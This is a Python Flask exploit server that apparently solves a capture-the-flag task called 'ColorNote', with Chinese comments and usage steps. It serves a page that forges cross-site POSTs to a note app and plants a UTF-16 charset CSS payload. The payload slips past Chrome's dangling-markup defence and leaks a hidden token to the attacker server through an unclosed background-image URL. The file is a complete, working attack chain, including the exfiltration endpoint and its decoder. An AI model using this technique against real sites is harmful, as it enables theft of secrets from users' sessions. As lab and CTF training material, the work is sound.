# -*- coding: utf-8 -*-
"""
Task 7: ColorNote - Dangling Markup + UTF-16 CSS 注入
=====================================================
解法：利用 UTF-16 CSS  charset 欺骗绕过 Chrome 的 dangling markup 防御，
通过 background-image 未闭合 URL 吞噬 <!--{token}--> 泄露到攻击者服务器。

使用方法：
  1. 在 WSL 中运行本脚本：python3 color_note_dangling_markup.py
  2. 另开终端执行：curl -s "http://127.0.0.1:44980/bot?url=http://<WSL_IP>:19999/exploit"
  3. 查看终端输出的 [token] 值
  4. 用 token 兑换 flag: curl -s "http://127.0.0.1:44980/redeem?token=<TOKEN>"

依赖：pip3 install flask
"""

import re
from flask import Flask, Response, request

CHALL_ORIGIN = "http://localhost:3000"  # 目标容器地址
PORT = 19999                             # 攻击服务器端口

app = Flask(__name__)


def decode_utf16_stream(encoded):
    """
    解码 UTF-16 流式编码的字符串。
    输入的 encoded 是以 %XX%YY%ZZ 三字节一组的 UTF-16 编码内容，
    每个三字节组代表一个 UTF-16 字符（big-endian）。
    """
    remaining = encoded
    out = []
    while remaining:
        chunk = remaining[:9]
        if not re.fullmatch(r"(?:%[0-9a-fA-F]{2}){3}", chunk):
            break
        remaining = remaining[9:]
        parts = chunk.split("%")[1:]
        bits = ""
        for index, part in enumerate(parts):
            byte_bits = format(int(part, 16), "08b")
            bits += byte_bits[4:] if index == 0 else byte_bits[2:]
        out.append(chr(int(bits[8:], 2)))
        out.append(chr(int(bits[:8], 2)))
    return "".join(out)


def payload_for_leak(exfil_url):
    """
    构造 UTF-16 CSS payload。
    
    原理：
    1. 将 CSS 内容 (*{background-image:url(<exfil_url>})
       转成 UTF-16 big-endian 编码（每个字符后加 %00）
    2. 前面加上 0x7f（DEL 字符，用于触发 UTF-16 解码）
       + <link rel=stylesheet href='data:text/css;charset=utf-16,'
    3. 浏览器解析此 data: CSS 时，charset=utf-16 会使后续所有 HTML
       被当作 UTF-16 解析，原本的 <, >, 换行符等变成乱码，
       Chrome 的 dangling markup 防御（检测 raw < 和换行符）被绕过
    4. background-image:url(...) 使用未闭合的括号/引号吞噬后续内容
    """
    resource = f"*{{background-image:url({exfil_url}"
    encoded = "".join(f"{char}%00" for char in resource)
    return f"\x7f<link rel=stylesheet href='data:text/css;charset=utf-16,{encoded}"


@app.route("/exploit")
def exploit():
    """
    返回恶意 HTML 页面，执行三步攻击：
    1. POST /notes/create — 创建包含 UTF-16 CSS 的 note
    2. POST /notes/2/edit — 添加单引号闭合 dangling markup
    3. 导航到 /notes — 触发 CSS 加载，泄露 token
    """
    public_origin = request.host_url.rstrip("/")
    payload = payload_for_leak(f"{public_origin}/leak?d=")
    
    return f"""<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>exploit</title>
</head>
<body>
  <script>
    const chall = {CHALL_ORIGIN!r};
    const popup = window.open("about:blank", "leakwin");

    // Step 1: 创建包含 UTF-16 CSS payload 的 note
    const createForm = document.createElement("form");
    createForm.method = "POST";
    createForm.action = chall + "/notes/create";
    createForm.target = "leakwin";

    // Step 2: 编辑 note/2（First Note）添加单引号闭合
    const editForm = document.createElement("form");
    editForm.method = "POST";
    editForm.action = chall + "/notes/2/edit";
    editForm.target = "leakwin";

    const createFields = {{
      title: "Scratch",
      bodyHtml: {payload!r}
    }};

    const editFields = {{
      title: "First Note",
      bodyHtml: "Nothing Here'"
    }};

    for (const [name, value] of Object.entries(createFields)) {{
      const input = document.createElement("input");
      input.type = "hidden";
      input.name = name;
      input.value = value;
      createForm.appendChild(input);
    }}

    for (const [name, value] of Object.entries(editFields)) {{
      const input = document.createElement("input");
      input.type = "hidden";
      input.name = name;
      input.value = value;
      editForm.appendChild(input);
    }}

    document.body.appendChild(createForm);
    document.body.appendChild(editForm);

    // 时序：先创建 note → 再编辑 note/2 添加闭合引号 → 最后导航到 /notes
    setTimeout(() => createForm.submit(), 100);
    setTimeout(() => editForm.submit(), 1500);
    setTimeout(() => {{
      if (popup) {{
        popup.location = chall + "/notes";
      }}
    }}, 3500);
  </script>
</body>
</html>"""


@app.route("/leak")
def leak():
    """
    接收 UTF-16 编码的泄露数据。
    
    URL 格式: /leak?d=<UTF16编码的HTML片段>
    解码后从中提取 <!--{32位hex}--> 模式的 token。
    """
    raw = request.query_string.decode("latin-1")
    hit = raw.split("d=", 1)[1] if "d=" in raw else ""
    decoded = decode_utf16_stream(hit)
    print(f"[leak] {decoded}", flush=True)

    m = re.search(r"<!--([0-9a-f]{32})-->", decoded, re.I)
    if m:
        token = m.group(1)
        print(f"[token] {token}", flush=True)
    else:
        print("[-] token not found in HTML comment", flush=True)

    return Response(status=204, headers={"Cache-Control": "no-store"})


if __name__ == "__main__":
    print(f"[*] Starting exploit server on :{PORT}")
    print(f"[*] Trigger: curl -s 'http://127.0.0.1:44980/bot?url=http://<WSL_IP>:{PORT}/exploit'")
    app.run(host="0.0.0.0", port=PORT)
